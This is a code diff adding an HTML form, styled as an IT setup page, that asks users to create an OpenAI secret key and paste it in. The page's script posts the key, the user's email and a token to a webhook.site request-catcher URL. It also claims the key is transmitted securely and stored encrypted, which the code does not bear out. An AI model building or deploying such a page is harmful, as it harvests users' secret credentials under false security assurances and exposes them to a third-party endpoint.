@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Submit OpenAI API Key</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header {
+            text-align: center;
+            color: #333;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        input[type="email"], input[type="password"], input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input[readonly] {
+            background-color: #f9f9f9;
+            color: #666;
+        }
+        .submit-btn {
+            background-color: #007dc1;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+        .submit-btn:hover {
+            background-color: #005a87;
+        }
+        .submit-btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .instructions {
+            background-color: #e8f4f8;
+            padding: 20px;
+            border-radius: 4px;
+            margin-bottom: 25px;
+            border-left: 4px solid #007dc1;
+        }
+        .error {
+            color: #d32f2f;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            border: 1px solid #c3e6cb;
+        }
+        .security-note {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔑 Submit Your OpenAI API Key</h1>
+            <p>Complete your AI development access setup</p>
+        </div>
+
+        <div class="instructions">
+            <h3>Before you submit:</h3>
+            <ol>
+                <li>Visit <a href="https://platform.openai.com/api-keys" target="_blank">OpenAI API Keys</a></li>
+                <li>Click "Create new secret key"</li>
+                <li>Name it exactly as shown below</li>
+                <li>Copy the key (starts with sk-)</li>
+                <li>Paste it in the form below</li>
+            </ol>
+        </div>
+
+        <div id="successMessage" class="success" style="display: none;">
+            ✅ Your API key has been submitted successfully! You will receive confirmation shortly.
+        </div>
+
+        <form id="keyForm">
+            <input type="hidden" id="token" name="token">
+            
+            <div class="form-group">
+                <label for="email">Your Email:</label>
+                <input type="email" id="email" name="email" readonly>
+            </div>
+
+            <div class="form-group">
+                <label for="keyname">Required Key Name:</label>
+                <input type="text" id="keyname" name="keyname" readonly 
+                       placeholder="This will auto-populate based on your email">
+            </div>
+            
+            <div class="form-group">
+                <label for="apikey">OpenAI API Key:</label>
+                <input type="password" id="apikey" name="apikey" 
+                       placeholder="sk-..." required>
+                <div class="error" id="apikeyError"></div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                Submit API Key
+            </button>
+        </form>
+
+        <div class="security-note">
+            🔒 <strong>Security:</strong> Your API key is transmitted securely and stored encrypted. 
+            Never share your API key with anyone else.
+        </div>
+    </div>
+
+    <script>
+        // Extract parameters from URL
+        function getUrlParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        // Initialize form when page loads
+        window.onload = function() {
+            const token = getUrlParameter('token');
+            const email = getUrlParameter('email');
+            
+            // For testing, allow the form to work even without parameters
+            if (!token || !email) {
+                // Use test values for now
+                document.getElementById('token').value = 'test-token-123';
+                document.getElementById('email').value = 'test@example.com';
+                document.getElementById('keyname').value = 'test@example.com-okta-managed';
+                
+                // Show a notice that this is test mode
+                const instructions = document.querySelector('.instructions');
+                instructions.innerHTML = '<h3>⚠️ TEST MODE</h3><p>This form is running in test mode. In production, it would be accessed via a secure link from your email.</p>' + instructions.innerHTML;
+            } else {
+                document.getElementById('token').value = token;
+                document.getElementById('email').value = email;
+                document.getElementById('keyname').value = email + '-okta-managed';
+            }
+        };
+
+        // Form validation
+        function validateApiKey(key) {
+            return key.startsWith('sk-') && key.length > 20;
+        }
+
+        // Form submission
+        document.getElementById('keyForm').onsubmit = function(e) {
+            e.preventDefault();
+            
+            const apiKey = document.getElementById('apikey').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const errorDiv = document.getElementById('apikeyError');
+            
+            // Clear previous errors
+            errorDiv.textContent = '';
+            
+            // Validate API key format
+            if (!validateApiKey(apiKey)) {
+                errorDiv.textContent = 'API key must start with "sk-" and be at least 20 characters long.';
+                return;
+            }
+
+            // Disable submit button
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+
+            // Prepare submission data
+            const formData = {
+                token: document.getElementById('token').value,
+                email: document.getElementById('email').value,
+                api_key: apiKey,
+                key_name: document.getElementById('keyname').value,
+                timestamp: new Date().toISOString()
+            };
+
+            // For now, we'll use webhook.site for testing
+            // Replace this URL with your actual webhook.site URL
+            const webhookUrl = 'https://webhook.site/REPLACE-WITH-YOUR-ACTUAL-WEBHOOK-SITE-ID';
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Show success message
+                    document.getElementById('successMessage').style.display = 'block';
+                    document.getElementById('keyForm').style.display = 'none';
+                } else {
+                    throw new Error('Submission failed');
+                }
+            })
+            .catch(error => {
+                errorDiv.textContent = 'Submission failed. Please try again or contact IT support.';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit API Key';
+            });
+        };
+    </script>
+</body>
+</html>
